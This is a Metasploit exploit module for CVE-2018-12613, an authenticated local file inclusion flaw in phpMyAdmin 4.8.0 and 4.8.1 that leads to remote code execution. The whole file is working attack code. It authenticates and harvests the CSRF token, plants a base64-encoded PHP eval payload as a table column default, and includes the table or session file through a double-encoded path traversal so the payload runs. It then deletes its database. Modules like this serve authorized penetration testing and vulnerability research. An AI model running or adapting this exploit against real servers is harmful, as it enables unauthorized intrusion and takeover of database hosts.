# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;phpMyAdmin Authenticated Remote Code Execution&#039;,
      &#039;Description&#039;     => %q{
        phpMyAdmin v4.8.0 and v4.8.1 are vulnerable to local file inclusion,
        which can be exploited post-authentication to execute PHP code by
        application. The module has been tested with phpMyAdmin v4.8.1.
      },
      &#039;Author&#039; =>
        [
          &#039;ChaMd5&#039;, # Vulnerability discovery and PoC
          &#039;Henry Huang&#039;, # Vulnerability discovery and PoC
          &#039;Jacob Robles&#039; # Metasploit Module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
          [ &#039;BID&#039;, &#039;104532&#039; ],
          [ &#039;CVE&#039;, &#039;2018-12613&#039; ],
          [ &#039;CWE&#039;, &#039;661&#039; ],
          [ &#039;URL&#039;, &#039;https://www.phpmyadmin.net/security/PMASA-2018-4/&#039; ],
          [ &#039;URL&#039;, &#039;https://www.secpulse.com/archives/72817.html&#039; ],
          [ &#039;URL&#039;, &#039;https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/&#039; ]
        ],
      &#039;Privileged&#039;  => false,
      &#039;Platform&#039;  => [ &#039;php&#039; ],
      &#039;Arch&#039;  => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [ &#039;Automatic&#039;, {} ],
          [ &#039;Windows&#039;, {} ],
          [ &#039;Linux&#039;, {} ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 19 2018&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base phpMyAdmin directory path", &#039;/phpmyadmin/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;root&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, "Password to authenticate with", &#039;&#039;])
      ])
  end

  def check
    begin
      res = send_request_cgi({ &#039;uri&#039; => normalize_uri(target_uri.path) })
    rescue
      vprint_error("#{peer} - Unable to connect to server")
      return Exploit::CheckCode::Unknown
    end

    if res.nil? || res.code != 200
      vprint_error("#{peer} - Unable to query /js/messages.php")
      return Exploit::CheckCode::Unknown
    end

    # v4.8.0 || 4.8.1 phpMyAdmin
    if res.body =~ /PMA_VERSION:"(\d+\.\d+\.\d+)"/
      version = Gem::Version.new($1)
      vprint_status("#{peer} - phpMyAdmin version: #{version}")

      if version == Gem::Version.new(&#039;4.8.0&#039;) || version == Gem::Version.new(&#039;4.8.1&#039;)
        return Exploit::CheckCode::Appears
      end
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Unknown
  end

  def query(uri, qstring, cookies, token)
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;import.php&#039;),
      &#039;cookie&#039; => cookies,
      &#039;vars_post&#039; => Hash[{
        &#039;sql_query&#039; => qstring,
        &#039;db&#039; => &#039;&#039;,
        &#039;table&#039; => &#039;&#039;,
        &#039;token&#039; => token
      }.to_a.shuffle]
    })
  end

  def lfi(uri, data_path, cookies, token)
    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;cookie&#039; => cookies,
      &#039;encode_params&#039; => false,
      &#039;vars_get&#039; => {
        &#039;target&#039; => "db_sql.php%253f#{&#039;/..&#039;*16}#{data_path}"
      }
    })
  end

  def exploit
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable&#039;)
    end

    uri = target_uri.path
    vprint_status("#{peer} - Grabbing CSRF token...")

    response = send_request_cgi({&#039;uri&#039; => uri})

    if response.nil?
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage grabbing CSRF token")
    elsif response.body !~ /token"\s*value="(.*?)"/
      fail_with(Failure::NotFound, "#{peer} - Couldn&#039;t find token. Is URI set correctly?")
    end
    token = Rex::Text.html_decode($1)

    if target.name =~ /Automatic/
      /\((?<srv>Win.*)?\)/ =~ response.headers[&#039;Server&#039;]
      mytarget = srv.nil? ? &#039;Linux&#039; : &#039;Windows&#039;
    else
      mytarget = target.name
    end

    vprint_status("#{peer} - Identified #{mytarget} target")

    #Pull out the last two cookies
    cookies = response.get_cookies
    cookies = cookies.split[-2..-1].join(&#039; &#039;)

    vprint_status("#{peer} - Retrieved token #{token}")
    vprint_status("#{peer} - Retrieved cookies #{cookies}")
    vprint_status("#{peer} - Authenticating...")

    login = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;cookie&#039; => cookies,
      &#039;vars_post&#039; => {
        &#039;token&#039; => token,
        &#039;pma_username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;pma_password&#039; => datastore[&#039;PASSWORD&#039;]
      }
    })

    if login.nil? || login.code != 302
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage")
    end

    #Ignore the first cookie
    cookies = login.get_cookies
    cookies = cookies.split[1..-1].join(&#039; &#039;)
    vprint_status("#{peer} - Retrieved cookies #{cookies}")

    login_check = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_get&#039; => { &#039;token&#039; => token },
      &#039;cookie&#039; => cookies
    })

    if login_check.nil?
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage")
    elsif login_check.body.include? &#039;Welcome to&#039;
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    elsif login_check.body !~ /token"\s*value="(.*?)"/
      fail_with(Failure::NotFound, "#{peer} - Couldn&#039;t find token. Is URI set correctly?")
    end
    token = Rex::Text.html_decode($1)

    vprint_status("#{peer} - Authentication successful")

    #Generating strings/payload
    database = rand_text_alpha_lower(5)
    table = rand_text_alpha_lower(5)
    column = rand_text_alpha_lower(5)
    col_val = "&#039;<?php eval(base64_decode(\"#{Rex::Text.encode_base64(payload.encoded)}\")); ?>&#039;"


    #Preparing sql queries
    dbsql = "CREATE DATABASE #{database};"
    tablesql = "CREATE TABLE #{database}.#{table}(#{column} varchar(4096) DEFAULT #{col_val});"
    dropsql = "DROP DATABASE #{database};"
    dirsql = &#039;SHOW VARIABLES WHERE Variable_Name Like "%datadir";&#039;

    #Create database
    res = query(uri, dbsql, cookies, token)
    if res.nil? || res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Failed to create database")
    end

    #Create table and column
    res = query(uri, tablesql, cookies, token)
    if res.nil? || res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Failed to create table")
    end

    #Find datadir
    res = query(uri, dirsql, cookies, token)
    if res.nil? || res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Failed to find data directory")
    end

    unless res.body =~ /^<td data.*?>(.*)?</
      fail_with(Failure::UnexpectedReply, "#{peer} - Failed to find data directory")
    end

    #Creating include path
    if mytarget == &#039;Windows&#039;
      #Table file location
      data_path = $1.gsub(/\\/, &#039;/&#039;)
      data_path = data_path.sub(/^.*?\//, &#039;/&#039;)
      data_path << "#{database}/#{table}.frm"
    else
      #Session path location
      /phpMyAdmin=(?<session_name>.*?);/ =~ cookies
      data_path = "/var/lib/php/sessions/sess_#{session_name}"
    end

    res = lfi(uri, data_path, cookies, token)

    #Drop database
    res = query(uri, dropsql, cookies, token)
    if res.nil? || res.code != 200
      print_error("#{peer} - Failed to drop database #{database}. Might drop when your session closes.")
    end
  end
end

